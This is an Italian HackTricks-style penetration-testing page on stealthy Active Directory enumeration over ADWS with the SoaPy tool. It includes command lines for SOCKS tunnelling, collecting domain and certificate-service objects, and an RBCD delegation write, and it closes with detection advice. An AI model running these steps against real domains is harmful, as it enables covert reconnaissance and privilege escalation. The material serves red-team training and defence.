# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Che cos'è ADWS?

Active Directory Web Services (ADWS) è **abilitato per impostazione predefinita su ogni Domain Controller da Windows Server 2008 R2** e ascolta su TCP **9389**. Nonostante il nome, **non è coinvolto alcun HTTP**. Invece, il servizio espone dati in stile LDAP attraverso un insieme di protocolli di incapsulamento proprietari .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Poiché il traffico è incapsulato all'interno di questi frame SOAP binari e viaggia su una porta poco comune, **l'enumerazione tramite ADWS è molto meno probabile che venga ispezionata, filtrata o firmata rispetto al traffico LDAP classico/389 & 636**. Per gli operatori questo significa:

* Ricognizione più furtiva – I team Blue spesso si concentrano sulle query LDAP.
* Libertà di raccogliere da **host non Windows (Linux, macOS)** tunnelando 9389/TCP attraverso un proxy SOCKS.
* Gli stessi dati che otterresti tramite LDAP (utenti, gruppi, ACL, schema, ecc.) e la possibilità di eseguire **scritture** (ad es. `msDs-AllowedToActOnBehalfOfOtherIdentity` per **RBCD**).

> NOTA: ADWS è utilizzato anche da molti strumenti GUI/PowerShell RSAT, quindi il traffico può mescolarsi con l'attività amministrativa legittima.

## SoaPy – Client Python Nativo

[SoaPy](https://github.com/logangoins/soapy) è una **re-implementazione completa dello stack di protocolli ADWS in puro Python**. Crea i frame NBFX/NBFSE/NNS/NMF byte per byte, consentendo la raccolta da sistemi simili a Unix senza toccare il runtime .NET.

### Caratteristiche Principali

* Supporta **il proxy attraverso SOCKS** (utile da impianti C2).
* Filtri di ricerca a grana fine identici a LDAP `-q '(objectClass=user)'`.
* Operazioni di **scrittura** opzionali ( `--set` / `--delete` ).
* Modalità di output **BOFHound** per l'ingestione diretta in BloodHound.
* Flag `--parse` per abbellire i timestamp / `userAccountControl` quando è necessaria la leggibilità umana.

### Installazione (host operatore)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

Il seguente flusso di lavoro mostra come enumerare **oggetti di dominio e ADCS** tramite ADWS, convertirli in JSON di BloodHound e cercare percorsi di attacco basati su certificati – tutto da Linux:

1. **Tunnel 9389/TCP** dalla rete target al tuo box (ad esempio tramite Chisel, Meterpreter, SSH dynamic port-forward, ecc.). Esporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` o usa `--proxyHost/--proxyPort` di SoaPy.

2. **Raccogli l'oggetto del dominio radice:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Raccogliere oggetti correlati a ADCS dalla Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converti in BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Carica il ZIP** nell'interfaccia grafica di BloodHound ed esegui query cypher come `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` per rivelare i percorsi di escalation dei certificati (ESC1, ESC8, ecc.).

### Scrittura di `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combina questo con `s4u2proxy`/`Rubeus /getticket` per una completa **Resource-Based Constrained Delegation** chain.

## Rilevamento e Indurimento

### Logging Verboso di ADDS

Abilita le seguenti chiavi di registro sui Domain Controllers per evidenziare ricerche costose / inefficienti provenienti da ADWS (e LDAP):
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Gli eventi appariranno sotto **Directory-Service** con il filtro LDAP completo, anche quando la query è arrivata tramite ADWS.

### Oggetti SACL Canary

1. Crea un oggetto fittizio (ad es. utente disabilitato `CanaryUser`).
2. Aggiungi un **Audit** ACE per il principale _Everyone_, auditato su **ReadProperty**.
3. Ogni volta che un attaccante esegue `(servicePrincipalName=*)`, `(objectClass=user)` ecc., il DC emette **Event 4662** che contiene il vero SID dell'utente – anche quando la richiesta è proxy o proviene da ADWS.

Esempio di regola predefinita di Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Riepilogo degli Strumenti

| Scopo | Strumento | Note |
|-------|-----------|------|
| Enumerazione ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lettura/scrittura |
| Ingestione BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte i log di SoaPy/ldapsearch |
| Compromissione Cert | [Certipy](https://github.com/ly4k/Certipy) | Può essere proxy attraverso lo stesso SOCKS |

## Riferimenti

* [SpecterOps – Assicurati di usare SOAP(y) – Una guida per operatori alla raccolta stealth di AD usando ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – Specifiche MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
